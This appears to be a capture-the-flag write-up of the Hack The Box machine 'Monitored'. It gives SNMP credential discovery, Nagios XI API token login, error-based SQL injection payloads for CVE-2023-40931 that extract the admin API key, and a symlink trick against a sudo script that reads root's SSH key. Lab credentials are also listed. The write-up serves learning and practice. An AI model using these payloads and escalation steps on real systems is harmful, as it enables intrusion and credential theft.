# Monitored \[Medium]

## Report

A Nagios XI interface whose login credentials are exposed via SNMP, however a simple user password auth does not work. Looking up forums, we find an alternative to generate a user token via REST API. This sets a cookie and we get access to the interface.

Searchsploit shows an authenticated SQLi exploit for version 5.11 as shown after logging in. We find out it's error based and we can retrieve information from the error message. Retrieve admin user 'nagiosadmin' password and apikey. The password is not crackable. However with the API key we can perform a bunch of functions.&#x20;

From the original API endpoint to login via svc creds, we fuzz using an API wordlist and find an API endpoint 'user' `/system/user` . The API documentation was pretty useless but did mention three main endpoints with system being admin specific. The chained root exploit also gave a good idea as to where to target even if it was an outdated exploit. Create a new user with admin privileges as shown in proof, run a reverse shell command and insert SSH keys.

User 'nagios' can run a bunch of scripts as sudo, a lot being PHP and running Nagios, one vector was to edit the nagios binary which was user writable and restart the service but that would crash the entire app so risky avenue in a real world pentest.

The other method was to look at the 'getprofile.sh' script which fetches data about a user and creates a zip file. Now IppSec taught us backing up/zipping aka operations involving other files -> symlinks. Create a symlink towards root SSH leys from a log file, run the script and follow the path where that file would be stored in the zip and become root.

{% embed url="https://support.nagios.com/forum/viewtopic.php?t=58783" %}

{% embed url="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/api" fullWidth="false" %}
objects.txt
{% endembed %}

{% embed url="https://github.com/datboi6942/Nagios-XI-s-CVE-2023-40931-Exploit/blob/main/exploit.py" %}
this one shows it as not blind
{% endembed %}

## Cheatsheet

```bash
SNMP 161(UDP)
/usr/local/nagios/bin/nagios
perl and python3
postgres and mariadb
-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB

389 LDAP
dn:
ldapsearch -H ldap://10.10.11.248 -x -s base namingcontexts
namingContexts: dc=monitored,dc=htb
ldapsearch -H ldap://10.10.11.248 -x -b "DC=monitored,DC=htb" '(objectClass=Person)'
ldapsearch -H ldap://10.10.11.248 -x -D 'CN=svc,DC=monitored,DC=htb' -w 'XjH7VCehowpR1xZB' -b "DC=monitored,DC=htb" 

80 (HTTP)
same website as HTTPS, stuff only show up there tho

443 (HTTPS)

Auth using svc creds to create token and login
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png

Authenticated SQLi [CVE-2023-40931]
Error-based - unlike boolean sqli, here we want to induce an error message to extract info from it
id=1 AND extractvalue(1,version())
groupconcat([colname]) will return all values in one query
id=1 AND extractvalue(1,SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='nagiosxi' and table_name='xi_users')
id=1 AND extractvalue(1,concat(0x0a, (SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='nagiosxi' and table_name='xi_users' limit 0,1)))

API Bruteforce to create new user (Refer Proof)


#PrivEsc
event_handler.log > /usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/event_handler.txt
ln -s /root/.ssh/id_rsa event_handler.log
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh
/usr/local/nagiosxi/var/components/profile-1754810688/nagios-logs$ cat event_handler.txt
```

## Loot

### Creds

```
svc:XjH7VCehowpR1xZB [SNMP]
53328569effc69c0cf72ee359febf77d14dd42d7 [Auth token gen for svc on nagios]
nagiosadmin:IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL [api_key]
```

### Proof

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption><p>unlike boolean sqli, here we want to induce an error message to extract info from it</p></figcaption></figure>

```
id=1 AND extractvalue(1,version())
group_concat([colname]) will return all rows in one query
```

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption><p>the concat (0x0a) introduces a newline which will generate an error for the id attribute hence bringing about the error</p></figcaption></figure>

`id=1 AND extractvalue(1,SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='nagiosxi' and table_name='xi_users')`

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

`id=1 AND extractvalue(1,concat(0x0a, (SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='nagiosxi' and table_name='xi_users' limit 0,1)))`

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (108).png" alt="" width="332"><figcaption><p>In the concat section, use a value that you know won't be common such as '|' will help extract values easier when passed to intruder</p></figcaption></figure></div>

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Use count to check whether manually searching or this is better

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption><p>moving apikey param from top to bottom fixed it</p></figcaption></figure>
